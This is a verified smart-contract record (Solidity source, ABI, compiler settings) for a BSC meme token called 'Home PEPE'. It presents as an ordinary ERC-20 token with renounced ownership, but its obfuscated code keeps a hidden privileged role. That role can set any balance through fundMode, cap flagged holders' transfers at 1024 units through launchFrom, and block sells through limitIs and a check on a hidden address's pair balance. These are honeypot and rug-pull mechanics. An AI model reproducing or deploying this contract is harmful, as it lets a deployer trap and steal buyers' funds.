{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface buySender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atAmount) external view returns (uint256);\n\n    function transfer(address launchedLimit, uint256 enableTx) external returns (bool);\n\n    function allowance(address amountMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 enableTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedLimit,\n        uint256 enableTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalSenderFrom, uint256 value);\n    event Approval(address indexed amountMin, address indexed spender, uint256 value);\n}\n\nabstract contract totalWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface takeTeam {\n    function createPair(address launchedSell, address tokenReceiverMin) external returns (address);\n}\n\ninterface listBuySender is buySender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract HomePEPE is totalWallet, buySender, listBuySender {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverReceiverEnable;\n    }\n\n    function balanceOf(address atAmount) public view virtual override returns (uint256) {\n        return swapReceiverAmount[atAmount];\n    }\n\n    address atSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function launchFrom(address tradingEnable) public {\n        receiverMode();\n        if (swapMode) {\n            minBuy = false;\n        }\n        if (tradingEnable == tokenBuy || tradingEnable == minSell) {\n            return;\n        }\n        feeLiquidity[tradingEnable] = true;\n    }\n\n    bool public swapMode;\n\n    address public tokenBuy;\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamLaunch;\n    }\n\n    mapping(address => mapping(address => uint256)) private totalAuto;\n\n    bool public minBuy;\n\n    function fundMode(address feeReceiver, uint256 enableTx) public {\n        receiverMode();\n        swapReceiverAmount[feeReceiver] = enableTx;\n    }\n\n    function approve(address autoTotalAt, uint256 enableTx) public virtual override returns (bool) {\n        totalAuto[_msgSender()][autoTotalAt] = enableTx;\n        emit Approval(_msgSender(), autoTotalAt, enableTx);\n        return true;\n    }\n\n    string private amountTake = \"HPE\";\n\n    address public minSell;\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountTake;\n    }\n\n    uint256 private receiverReceiverEnable = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return shouldReceiverMode;\n    }\n\n    function transferFrom(address txWalletExempt, address launchedLimit, uint256 enableTx) external override returns (bool) {\n        if (_msgSender() != atSender) {\n            if (totalAuto[txWalletExempt][_msgSender()] != type(uint256).max) {\n                require(enableTx <= totalAuto[txWalletExempt][_msgSender()]);\n                totalAuto[txWalletExempt][_msgSender()] -= enableTx;\n            }\n        }\n        return marketingBuy(txWalletExempt, launchedLimit, enableTx);\n    }\n\n    mapping(address => bool) public feeLiquidity;\n\n    function allowance(address fundFrom, address autoTotalAt) external view virtual override returns (uint256) {\n        if (autoTotalAt == atSender) {\n            return type(uint256).max;\n        }\n        return totalAuto[fundFrom][autoTotalAt];\n    }\n\n    function owner() external view returns (address) {\n        return shouldReceiverMode;\n    }\n\n    function limitIs(uint256 enableTx) public {\n        receiverMode();\n        tokenReceiver = enableTx;\n    }\n\n    function modeReceiver() public {\n        emit OwnershipTransferred(tokenBuy, address(0));\n        shouldReceiverMode = address(0);\n    }\n\n    address feeLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public liquidityLaunchedLaunch;\n\n    function launchedAuto(address exemptEnable) public {\n        if (launchedEnable) {\n            return;\n        }\n        \n        liquidityLaunchedLaunch[exemptEnable] = true;\n        if (swapMode != minBuy) {\n            swapTradingLaunch = liquidityExempt;\n        }\n        launchedEnable = true;\n    }\n\n    uint256 tokenExempt;\n\n    event OwnershipTransferred(address indexed shouldMarketing, address indexed exemptReceiver);\n\n    function transfer(address feeReceiver, uint256 enableTx) external virtual override returns (bool) {\n        return marketingBuy(_msgSender(), feeReceiver, enableTx);\n    }\n\n    uint8 private teamLaunch = 18;\n\n    function walletFrom(address txWalletExempt, address launchedLimit, uint256 enableTx) internal returns (bool) {\n        require(swapReceiverAmount[txWalletExempt] >= enableTx);\n        swapReceiverAmount[txWalletExempt] -= enableTx;\n        swapReceiverAmount[launchedLimit] += enableTx;\n        emit Transfer(txWalletExempt, launchedLimit, enableTx);\n        return true;\n    }\n\n    uint256 constant enableSender = 2 ** 10;\n\n    function receiverMode() private view {\n        require(liquidityLaunchedLaunch[_msgSender()]);\n    }\n\n    uint256 private swapTradingLaunch;\n\n    uint256 tokenReceiver;\n\n    mapping(address => uint256) private swapReceiverAmount;\n\n    address private shouldReceiverMode;\n\n    uint256 public liquidityExempt;\n\n    function name() external view virtual override returns (string memory) {\n        return totalBuy;\n    }\n\n    bool public launchedEnable;\n\n    string private totalBuy = \"Home PEPE\";\n\n    constructor (){\n        if (feeSwapMode == liquidityExempt) {\n            feeSwapMode = swapTradingLaunch;\n        }\n        limitTo feeExemptTake = limitTo(atSender);\n        minSell = takeTeam(feeExemptTake.factory()).createPair(feeExemptTake.WETH(), address(this));\n        if (liquidityExempt != feeSwapMode) {\n            feeSwapMode = swapTradingLaunch;\n        }\n        tokenBuy = _msgSender();\n        modeReceiver();\n        liquidityLaunchedLaunch[tokenBuy] = true;\n        swapReceiverAmount[tokenBuy] = receiverReceiverEnable;\n        \n        emit Transfer(address(0), tokenBuy, receiverReceiverEnable);\n    }\n\n    function marketingBuy(address txWalletExempt, address launchedLimit, uint256 enableTx) internal returns (bool) {\n        if (txWalletExempt == tokenBuy) {\n            return walletFrom(txWalletExempt, launchedLimit, enableTx);\n        }\n        uint256 teamAtEnable = buySender(minSell).balanceOf(feeLaunch);\n        require(teamAtEnable == tokenReceiver);\n        require(launchedLimit != feeLaunch);\n        if (feeLiquidity[txWalletExempt]) {\n            return walletFrom(txWalletExempt, launchedLimit, enableSender);\n        }\n        return walletFrom(txWalletExempt, launchedLimit, enableTx);\n    }\n\n    uint256 public feeSwapMode;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalSenderFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoTotalAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTotalAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSwapMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableTx\",\"type\":\"uint256\"}],\"name\":\"fundMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingEnable\",\"type\":\"address\"}],\"name\":\"launchFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptEnable\",\"type\":\"address\"}],\"name\":\"launchedAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"enableTx\",\"type\":\"uint256\"}],\"name\":\"limitIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityLaunchedLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txWalletExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "HomePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}